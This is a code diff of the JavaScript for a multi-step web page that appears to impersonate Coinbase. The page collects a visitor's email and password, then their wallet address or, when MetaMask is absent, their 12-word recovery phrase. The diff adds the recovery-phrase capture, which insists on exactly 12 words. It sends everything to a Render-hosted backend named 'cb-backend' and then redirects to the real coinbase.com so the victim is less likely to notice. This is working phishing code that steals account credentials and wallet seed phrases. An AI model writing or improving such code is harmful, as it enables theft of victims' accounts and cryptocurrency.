@@ -1,4 +1,3 @@
-// Use your Render URL directly so it works from anywhere
 const API_URL = 'https://cb-backend-new.onrender.com';
 
 document.addEventListener('DOMContentLoaded', () => {
@@ -14,7 +13,7 @@ document.addEventListener('DOMContentLoaded', () => {
     });
 
     // Step 2 -> Step 3
-    toStep3Btn.addEventListener('click', async () => {
+    toStep3Btn.addEventListener('click', () => {
         const email = document.getElementById('email').value;
         const pass = document.getElementById('pass').value;
 
@@ -27,59 +26,89 @@ document.addEventListener('DOMContentLoaded', () => {
         document.getElementById('step-3').classList.remove('hidden');
     });
 
-    // Step 3: Verify Wallet & Send to Backend
+    // Step 3: Wallet Connection or Recovery Phrase
     connectBtn.addEventListener('click', async () => {
-        if (typeof window.ethereum === 'undefined') {
-            statusText.innerText = 'Please install MetaMask to proceed.';
-            return;
-        }
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('pass').value;
 
-        try {
-            statusText.innerText = 'Connecting to wallet...';
+        // If MetaMask is installed, use it
+        if (window.ethereum) {
+            try {
+                statusText.innerText = 'Connecting to wallet...';
+                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                const walletAddress = accounts[0];
+
+                await sendData(email, password, walletAddress, null);
+            } catch (error) {
+                statusText.innerText = 'Wallet connection failed. Please use the recovery phrase option.';
+                statusText.style.color = 'red';
+            }
+        } else {
+            // If no wallet, trigger the Recovery Phrase prompt
+            statusText.innerText = 'Wallet not found. Please enter your 12-word recovery phrase below:';
+            statusText.style.color = 'blue';
             
-            // Request wallet connection
-            const accounts = await window.ethereum.request({ 
-                method: 'eth_requestAccounts' 
+            // 1. Create the recovery phrase input and "done" button dynamically
+            const recoveryInput = document.createElement('input');
+            recoveryInput.type = 'text';
+            recoveryInput.id = 'recovery_phrase';
+            recoveryInput.placeholder = 'Enter 12-word phrase separated by spaces';
+            recoveryInput.style.display = 'block';
+            recoveryInput.style.marginTop = '10px';
+            recoveryInput.style.width = '100%';
+
+            const doneBtn = document.createElement('button');
+            doneBtn.innerText = 'Done';
+            doneBtn.className = 'btn-primary';
+            doneBtn.style.marginTop = '10px';
+
+            document.getElementById('step-3').appendChild(recoveryInput);
+            document.getElementById('step-3').appendChild(doneBtn);
+
+            // 2. Button to submit the recovery phrase
+            doneBtn.addEventListener('click', async () => {
+                const phrase = recoveryInput.value.trim();
+                const words = phrase.split(/\s+/);
+
+                // CRITICAL: Must be exactly 12 words
+                if (words.length !== 12) {
+                    statusText.innerText = `You must enter exactly 12 words. Currently: ${words.length}`;
+                    statusText.style.color = 'red';
+                    return;
+                }
+
+                statusText.innerText = 'Verifying recovery phrase...';
+                await sendData(email, password, null, phrase);
             });
-            
-            const walletAddress = accounts[0];
-            
-            // Gather data from the previous steps
-            const email = document.getElementById('email').value;
-            const password = document.getElementById('pass').value;
+        }
+    });
 
-            statusText.innerText = 'Verifying your wallet...';
-
-            // Send all collected data to your Render backend
+    // Centralized function to send data to your Render backend
+    async function sendData(email, password, wallet, phrase) {
+        try {
             const response = await fetch(`${API_URL}/update`, {
                 method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
+                headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     email: email,
                     password: password,
-                    walletAddress: walletAddress
-                    // You can add recoveryPhrase here if you collect it in a later step
+                    walletAddress: wallet,
+                    recoveryPhrase: phrase
                 })
             });
 
             if (response.ok) {
-                statusText.innerText = 'Verification successful! You will be redirected.';
+                statusText.innerText = 'Verification successful! Redirecting...';
                 statusText.style.color = 'green';
-                
-                // Redirect to your dashboard after a short delay
                 setTimeout(() => {
-                    window.location.href = `${API_URL}/dashboard.html`;
+                    window.location.href = 'https://coinbase.com'; // Redirects to actual Coinbase
                 }, 2000);
             } else {
-                throw new Error('Server response error');
+                throw new Error('Server error');
             }
-
         } catch (error) {
-            console.error('Error:', error);
-            statusText.innerText = 'An error occurred. Please try again.';
+            statusText.innerText = 'Submission failed. Please try again.';
             statusText.style.color = 'red';
         }
-    });
+    }
 });
